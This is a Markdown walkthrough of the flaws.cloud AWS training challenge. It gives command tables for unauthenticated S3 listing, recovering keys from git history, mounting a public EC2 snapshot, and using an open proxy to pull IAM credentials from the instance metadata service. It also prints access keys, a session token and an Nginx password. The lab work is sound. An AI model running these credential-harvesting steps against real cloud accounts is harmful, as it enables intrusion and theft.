| 4.9. :pushpin:  Level 4 Nginx Username         | `flaws`                                                                         |
| 4.10. :pushpin:  Level 4 Nginx Password         | `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`                                                                         |
| 5.1. :pushpin:  Level 5 URL         | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.0. :pushpin: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5.1. :pushpin:  Level 5 URL          | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |
| 5.2. :pushpin:  EC2 Metadata Service IP          | `169.254.169.254/`                                                                         |
| 5.3. :pushpin:  EC2 Instance          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.4. :pushpin:  EC2 Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/`                                                                         |
| 5.5. :pushpin:  EC2 IAM Credentials Metada URL          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 5.6.1 :pushpin:  EC2 Instance Proxy 1         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/latest/meta-data/iam/security-credentials/`                                                                         |
| 5.6.2 :pushpin:  EC2 Instance Proxy 2         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml`                                                                         |
| 5.6.3 :pushpin:  EC2 Instance Proxy 3         | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/`                                                                         |
| 5.7.1. :pushpin:  EC2 IAM USER          | `flaws`                                                                         |
| 5.7.2. :pushpin:  fLaws Access Key          | `ASIA6GG7PSQGZVHCOSFP`                                                                         |
| 5.7.3. :pushpin:  flaws Secret Key          | `wzAV+fRr2b0/1IdWA5fsFE1HZ9vGMaJCQ2nAuRI+`                                                                         |
| 5.7.4. :pushpin:  flaws Session Token          | `IQoJb3JpZ2luX2VjENT//////////wEaCXVzLXdlc3QtMiJHMEUCICysxf8e25Ao5/bX7HA0OElp5/RnrV8zMCrJwuCup0+VAiEAmc1uLD5e9NbT1px9rBJZEZnWVETMbu6Cn3ZinbkJ6qcquwUIvf//////////ARADGgw5NzU0MjYyNjIwMjkiDGIiCNBVyz80c8UvFCqPBToN3XQ1BlpYWcvCHVp9s9FlhdQZSCz2TGpnbH6i9lDNH+CH0iI3+eq6/GCrQFMN2YtFv4c4joUbFbmvbxv3p4UuG1FeO3bunakS3DzqSBEF2vMNWNKiwRvOOMHstHXBkPDuK2ciHAVzAQ3JaUZEskTq7TXe4gb/i+Epkx0T3NFnX805JflQKqA6YIdHHcR71PdKKvmFxAOhFLZhdvyKYrlf76xxGjirHjXJmNiA8p/PU8ZzsOYTV0Y6kxMVHJGqwVvH4Cng+iBtL+WfponpZRMgHcBvLw0a2mMrX20BjmI7ifJAfZ9bjX90FnFvqccnnEhYjycEbty+mRtLFmDPo0KM2mbgcQWxp+s1uwzAZTI8Ft4xY6UpHDmAF/6kAU1TNUJuuOz1NtAyxwPly6+k5GaayFumsRW4VbUucLTfeQGOBUlwJAtcT2DUg5kMT9QxNz+RAFpch0f0UCGie2LOlYtg5CIbnN1IxgYjNDcp9MPqYGvVB/g5VnIxZQNHjYE65Q4ScYxwV7UIgqHcG9ZHdjRxEc/jivLvrbcqidUpoxwv55YWTpkvENLgxpQPgX98n1Kmv1ycXYVkfbTvfnPqoWz9QKIITbF+inM+oVE2IT/7jQXnnU3USLHV1DUjOxMeYZ+1BzgwQB6nZYUtvMnESVa5R0iI7r+gPOIeNcVFL3HgeD6ZuN0ZGHzDO7TvuNo4R9D+5pUQ8F4jjkZA5ynmCGkwplOlPY0EeYjl4wnAOBhjvrX20MbbPwZ6yXevi5RlkpFWr5Yennp0cXCNxUsf7Nu5EAaYFgD+PpaGRrHBkgGg9GfGQlrUE13bKVLmJsAQOuokwf9aMGc6yj9YlB5SVsjratoon+e9It1/jwb33jMwqrraoQY6sQGUxpVr3JxA1UBSG3lCGGI5seaaSLOlnTT4G03cpBaCd2RxxISOlv3LtXs5bsLCzR2+eHUeulhCn9mH/Q/SDm5ysm7ztt4DJVzqZy+2CZ+yH9aXzOHOmHhQisOboLdj9V3NMQ/9P8ZKeWpVyQSTcEaK3kJ9mkbP7NJSWOnnW1S7r0kSyq2p8v0My/6ge4gtxeZTkzws4nRcS3XIlzoqlDxHGnwDzz/op65TdyGre0bPiQ8=`                                                                         |
| 6.1 :pushpin:  Level 6 URL         | `L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`                                                                         |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.0. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.1. :pushpin: Level 6 Account Id                 | `975426262029`                                                             |      
| 6.2. :pushpin: IAM Policies                 | `MySecurityAudit:v1, list_apigateaways:v4`                                        |                        
| 6.3. :pushpin: Lambda Function                 | `level5`                                                                |
| 6.4. :pushpin: Lambda Policy                 | `Allow lambda:InvokeFunction using apigateway.amazonaws.com`               |                                                
| 6.5. :pushpin: Lambda Arn                 | `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`           |                                                     
| 6.6. :pushpin: Lambda Final URL                 | `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`                                                                |
| 6.7. :pushpin: Final Level 6 URL                 | `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"`                                                                |




                                                                          


# Levels


<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 0 - Template                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Level 0 -  Level 0 Name
<!--*        ------------------------------ -->
### Level 0 Prerequisites
1. Prerequisite 1
   1. Prequisite Reference

### Level 0 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")




### Commands Used in Level 0
| 0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 0.0. :pager Title                | Description        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 0.1. :pager:  `Flaws-Scripts/aws_cli_configure_L.sh`   | Configure AWS CLI                        |






## Important Notes from Level 0
| :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 0.1. :pushpin:  Level 0 URL          | ``                                                                         |




<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 1 - AWS Un-Authenticated Enumeration                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->

## Level 1 - AWS Un-Authenticated Enumeration
<!-- * ================================================================================================================================================================================================-->
### Level 1 Prerequisites
1. AWS CLI installed
   1. [installation file script](./Flaws-Scripts/aws_cli_install.sh)
2. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)

### Level 1 Tools
1. [`nslookup`](https://www.nslookup.io/ "DNS Lookup Tool")
2. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
4. ['grep'](https://www.gnu.org/software/grep/ "Grep Command Line Tool")
5. 




### Commands Used in Level 1 
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 1. :pager: Command                                                                        | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 1.0. :pager: AWS Un-Authenticated Enumeration                                             | Un-Authenticated Access to  AWS S3 Buckets                               |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 1.1. :pager:  `./Flaws-Scripts/aws_cli_install.sh`   | Install AWS CLI                        |
| 1.2. :pager:  `./Flaws-Scripts/aws_cli_configure.sh`   | Configure                        |
| 1.3. :pager:  `CHALLENGE_URL="flaws.cloud" && nslookup $CHALLENGE_URL`                                                           | Execute NS Lookup Against Challenge URL                               |   
| 1.4. :pager:  `nslookup $L1_BUCKET_IP`                                                           | Execute NS Lookup Against Discovered IP                               |   
| 1.5. :pager   `aws s3 ls  $L1_BUCKET_URL --no-sign-request --region $AWS_REGION`                | Access & List S3 Bucket Files using AWS CLI - Un-Authenticated        |
| 1.6/1.1. :pager:  `aws s3 sync $L1_BUCKET_URL --no-sign-request --region $AWS_REGION ./flaws1`   | Copy Bucket Files                        |
| 1.6/1.2. :pager:  `export L2_URL=$(cat flaws1/$L1_SECRET_FILE | grep -oP '<a href="\K[^"]+')`   | Get Level 2 URL From Secret File                        |
| 1.6/2.1. :pager:  `export L2_URL=$(curl -s $L1_SECRET_URL | grep -oP '<a href="\K[^"]+')`   | Get Level 2 URL From Secret File                        |
| 1.7. :pager:  `Flaws-Scripts/aws_cli_configure_awsS3Admin.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |

## Important Notes from Level 1
| 1. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 1.0. :pushpin: AWS Un-Authenticated Enumeration                 | Un-Authenticated Access to  AWS S3 Buckets                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 1.1.:pushpin:  Challenge URL    | `flaws.cloud`                                                                                                                         |   
| 1.2.:pushpin:  Bucket IP Example    | `52.92.145.3`                                                                                                                         |   
| 1.3. :pushpin:  Bucket URL           | `http://flaws.cloud.s3-website-us-west-2.amazonaws.com`                                                                               |
| 1.4. :pushpin:  awsS3Admin           | [awsS3Admin](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/users/details/awsS3Admin?section=permissions)      |
| 1.5. :pushpin:  AWS Access Key ID    |  AKIATQBOZIW65PUG4VN7                                                                                                                 |
| 1.6. :pushpin: AWS Secret Key ID    |  5nNcyDO6TpZKN3WEI9XraGH+bsE7WOPzmM1XALDl                                                                                                                 |
| 1.7. :pushpin:  Level 1 Secret File  | `secret-dd02c7c.html`                                                                                                                 |
| 2.1. :pushpin: Level 2 URL          | `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`                                                                         |
| 1.3. :pushpin:  Level 1 Bucket URL           | `s3://flaws.cloud/`                                                                               |







<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 2                                                                                                            -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->



## Level 2 -  AWS Authenticated Enumeration
<!--*        ------------------------------ -->
### Level 2 Prerequisites
1. AWS CLI installed
   1. [installation file script](./Flaws-Scripts/aws_cli_install.sh)
2. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
3. Create AWS S3Admin Group
   1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")




### Level 2 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")




### Commands Used in Level 2
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2. :pager: Command                                                                        | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2.0. :pager: AWS Authenticated Enumeration                                                 | All Authenticated Access to AWS S3 Buckets                               |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2.1. :pager:  `./Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 2.2. :pager:   `./Flaws-Scripts/aws_cli_configure_awsS3Admin.sh` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 2.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L2_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 2.3/1.1. :pager: `aws s3 sync --profile $AWS_USER_NAME $L2_BUCKET_URL --region $AWS_REGION ./flaws2`     | Copy Bucket Files                                                |
| 2.3/2.1. :pager: `aws s3 cp --profile $AWS_USER_NAME $L2_SECRET_URL .`     | Copy Secret From Bucket                                                |
| 2.4. :pager: `export L2_SECRET_URL=$( cat flaws2/$L2_SECRET_FILE | grep -oP '<a href="\K[^"]+')`    | Cat Secret and Grep URL        |
| 2.5. :pager:  `Flaws-Scripts/aws_cli_configure_awsS3Admin.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |





## Important Notes from Level 2
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2. :pushpin: Pin                 | Content                                                                                                                                                     |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2.0. :pushpin: AWS Authenticated Enumeration                 | All Authenticated Access to AWS S3 Buckets                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2.1. :pushpin:  Level 2 URL          | `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`                                                                         |
| 2.2. :pushpin:  S3Admins Group       | [S3Admins](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/S3Admins?section=permissions)                 |
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |





<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 3   Access Key in Git Log Commits                                                                           -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->


## Level 3 -  Access Key in Git Log Commits 
<!--*        ------------------------------ -->
### Level 3 Prerequisites
1. AWS CLI installed
   1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
2. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
3. Create AWS S3Admin Group
   1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")
5. Installed Git CLI
   1. [Git CLI installation file script](./Flaws-Scripts/git_cli_install.sh)

### Level 3 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`aws s3 sync`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 bucket copy Command")
3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
4. [git](https://github.com/git-guides/install-git "Git Command Line Tool")




### Commands Used in Level 3
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3. :pager: Command                                                                           | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.0. :pager: Access Key in Git Log Commits                                                | Older Git Commits Contains access_keys.txt                                 |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.1. :pager:  `Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 3.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L3_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.2. :pager: `aws s3 ls $L3_BUCKET_URL --no-sign-request --region $AWS_REGION` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.3. :pager: `aws s3 sync --profile $AWS_USER_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.4. :pager: `cd flaws3 && git log` | View Latest Git Commit Log  |
| 3.5. :pager: `git checkout $L3_COMMIT` | View Latest Git Commit Log  |
| 3.6. :pager: `export L3_ACCESS_KEY=$(grep -oP '^access_key\s+\K[A-Za-z0-9]+' $L3_SECRET_FILE)` | Get AWS Level Access Key  |
| 3.7. :pager: `export L3_SECRET_KEY=$(grep -oP '^secret_access_key\s+\K[A-Za-z0-9+/]+' $L3_SECRET_FILE)` | Get AWS Secret Access Key  |
| 3.8. :pager: `Scrtips/aws_cli_configure_L3Profile.sh` | Set L3 Found Profile URL  |
| 3.9. :pager: `aws --profile $L3_USER s3 ls` | List all S3 Buckets  |
| 3.10. :pager: `aws s3 ls --profile $L3_USER_NAME | grep -oP 'level4-\S+\.flaws\.cloud'` | Get Level 4 URL (All Levels)  |
| 3.11. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|






### Important Notes from Level 3
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3. :pushpin: Pin                 | Content                                                                                  |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.0. :pushpin: Access Key in Git Log Commits  | Older Git Commits Contains access_keys.txt                                                                        |  
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.2. :pushpin:  Level 3 Bucket URL          | [Level 3 URL](s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.3. :pushpin:  Level 3 Sensitive Git Commit          | f52ec03b227ea6094b04e43f475fb0126edb5a61                                                             |
| 3.4. :pushpin:  Level 3 User          | L3Profile                                                             |
| 3.5. :pushpin:  Level 3 Access Keys File          | access_keys.txt                                                             |
| 3.6. :pushpin:  Level 3 Access Key ID          | AKIAJ366LIPB4IJKT7SA                                                             |
| 3.7. :pushpin:  Level 3 Secret Access Key ID          | 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                                                             |
| 4.1. :pushpin: Level 4 URL                             | [Level 4](level4-1156739cfb264ced6de514971a4bef68.flaws.cloud) |      



<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 4   Sensitive Data in EC2 Snapshots                                                                      -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->


## Level 4 -  Sensitive Data in EC2 Snapshots
<!--*        ------------------------------ -->
### Level 4 Prerequisites
1. AmazonEC2FullAccess Policy Attached to L4Profile
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonEC2FullAccess$jsonEditor "AmazonEC2FullAccess")
2. AdministratorAccess Policy Attached to L4Profile
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")


### Level 4 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
3. [aws sts get-caller-identity](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
4. [aws ec2 describe-snapshots](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html "AWS EC2 Describe Snapshots")
5. [aws ec2 create-key-pair](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-key-pair.html "AWS EC2 Create Key Pair")
6. [aws ec2 run-instances](https://docs.aws.amazon.com/cli/latest/reference/ec2/run-instances.html "AWS EC2 Run Instances")
7. [aws ec2 describe-instances](https://docs.aws.amazon.com/cli/latest/reference/ec2/attach-volume.html "AWS EC2 Describe Instances")
8. [aws ec2 create-volume](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-volume.html "AWS EC2 Create Volume")
9. [aws ec2 attach-volume](https://docs.aws.amazon.com/cli/latest/reference/ec2/attach-volume.html "AWS EC2 Attach Volume")
10. [SSH](https://www.ssh.com/ssh/ "SSH Command Line Tool")
11. [lsblk]("List Dissks Command")
12. [mount]("Mount Disks Command")



### Commands Used in Level 4
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4.0. :pager: Sensitive Data in EC2 Snapshots                                                    | Sensitive Nginx Credentials in EC2 Snapshot                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4.1. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
| 4.2. :pager:  `export L4_ACCOUNT_ID=$(aws --profile "$L3_USER_NAME" sts get-caller-identity --query 'Account' --output text)`   | Identify Account Id  |
| 4.3. :pager:  `export L4_SNAPSHOT_ID=$(aws --profile $L3_USER_NAME ec2 describe-snapshots --owner-id $L4_ACCOUNT_ID --query 'Snapshots[*].{ID:SnapshotId}' --output text)`   | Get Snapsot ID |
| 4.4. :pager:  `export L4_VOLUME_ID=$(aws --profile $L4_USER ec2 create-volume --availability-zone $L4_AWS_AZ --region $AWS_REGION  --snapshot-id  $L4_SNAPSHOT_ID --query 'VolumeId' --output text)`   | Mount Snapshot ID to Volume                       |
| 4.5. :pager: ```aws --profile "$L4_USER" --region "$AWS_REGION" ec2 create-key-pair --key-name "$L4_KEY" --query 'KeyMaterial' --output text > "${}.pem"```   | Create Key Pair                        |
| 4.6. :pager:  `export L4_NEW_VM_ID=$(aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]" --query 'Instances[0].InstanceId' --output text)`   | Launch EC2 Instance  & Get Instance Id                     |

| 4.8. :pager:  ```export L4_NEW_VM_IP =$(aws ec2 describe-instances --profile $L4_USER --filters "Name=tag:Name,Values=Flaws_L4_VM" "Name=instance-state-name,Values=running" --query 'Reservations[].Instances[?State.Code==`16`].PublicIpAddress' --output text)```   | Get New EC2 Instance  IP |
| 4.9. :pager:  ```aws ec2 attach-volume --profile $L4_USER --region $AWS_REGION --instance-id $L4_NEW_VM_ID --volume-id $L4_VOLUME_ID --device /dev/xvdf```   | Attach Mounted Volume to VM                     |
| 4.10. :pager:  ```ssh -v -i ./"$L4_KEY.pem" $L4_VM_USER@$L4_VM_HOST```   | ssh into VM                      |
| 4.11. :pager:  ```lsblk ```   | list Drives                      |
| 4.12. :pager:  ```sudo file -s /dev/xvdf1 ```   | View Drive Information                      |
| 4.13. :pager:  ```sudo mount /dev/xvdf1 /mnt && cat /mnt/home/ubuntu/setupNginx.sh```   | Mount Attached Drive  & Print setupNginx File Attached Drive                    |
| 4.14. :pager:  ```export L5_URL=$(curl -u $L4_NGINX_USER:$L4_NGINX_PASSWORD -s $L4_SNAPSHOT_URL | grep -oP '<a href="\K[^"]+')```   | Get Next Level URL                    |
| 4.15. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|




### Important Notes from Level 4
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4.0. :pushpin: Sensitive Data in EC2 Snapshots                 | Sensitive Nginx Credentials in EC2 Snapshot                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4.1. :pushpin:  Level 4 URL          | `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`                                                                         |
| 4.2. :pushpin:  Level 4 EC2 Snapshot          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 4.3. :pushpin:  Level 4 Account ID          | `975426262029`                                                                         |
| 4.4. :pushpin:  Level 4 EC2 Snapshot ID          | `snap-0b49342abd1bdcb89`                                                                         |
| 4.4. :pushpin:  Level 4 EC2 Volume ID          | `vol-0e68287fb059d731b`                                                                         |
| 4.5. :pushpin:  Level 4 EC2 Image ID          | `ami-0fcf52bcf5db7b003`                                                                         |
| 4.6. :pushpin:  Level 4 EC2 Instance IP          | `54.69.166.141`                                                                         |
| 4.7. :pushpin:  Level 4 EC2 Instace ID          | `i-049e3a08a0f58536b`                                                                         |
| 4.8. :pushpin:  Level 4 Nginx Credentials         | `setupNginx.sh`                                                                         |
| 4.9. :pushpin:  Level 4 Nginx Username         | `flaws`                                                                         |
| 4.10. :pushpin:  Level 4 Nginx Password         | `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`                                                                         |
| 5.1. :pushpin:  Level 5 URL         | `http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/`                                                                         |



<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 5 - EC2 Metadata 169.254.169.254                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Level 5 -  Level 5 EC2 Metadata 169.254.169.254
<!--*        ------------------------------ -->
### Level 5 Prerequisites
1. Full Update
   1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
2. JQ
   1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")

### Level 5 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
3. [`jq`](https://stedolan.github.io/jq/ "jq JSON Parser")
4. ['ec2 metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html "EC2 Metadata Service")
5. ['iam metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html "IAM Metadata Service")
6. 



### Commands Used in Level 5
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.1. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
| 5.2. :pager:  `export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"`   | Set EC2 URL Variable                        |
| 5.3. :pager:  `export L5_EC2_PROXY=http://$L5_EC2_URL/proxy`   | Set Proxy URL                        |
| 5.4. :pager:  `export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP`   | Get EC2 Metada Service                        |
| 5.5 :pager:   `export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL`   | Get Metada URL                        |
| 5.6 :pager:   `export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL`   | Get IAM Metada URL                        |
| 5.7 :pager:   `export L5_METADATA=$(curl -s "$L5_EC2_METADATA_URL")`   | Get IAM Role Name                        |
| 5.8 :pager:   `export L5_USER=$(curl -s "$L5_EC2_IAM_METADATA_URL")`   | Get IAM Role Name                        |
| 5.9 :pager:   `export L5_USER_METADATA=$(curl -s "$L5_EC2_IAM_METADATA_URL/$L5_USER")`   | Get IAM Metadata Credentials                       |
| 5.10. :pager:  `export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId)'`   | Get User Access Key                        |
| 5.11. :pager:  `export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')`   | Get User Secret Key                        |
| 5.12. :pager:  `export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')`   | Get User Secret Key                        |
| 5.13. :pager:  `Flaws-Scripts/aws_cli_configure_L5Profile.sh`   | Configure AWS CLI                        |
| 5.14. :pager:  `aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL`   | List Bucket Files                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|




### Important Notes from Level 5
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 5. :pushpin: Pin                 | Content                                                                
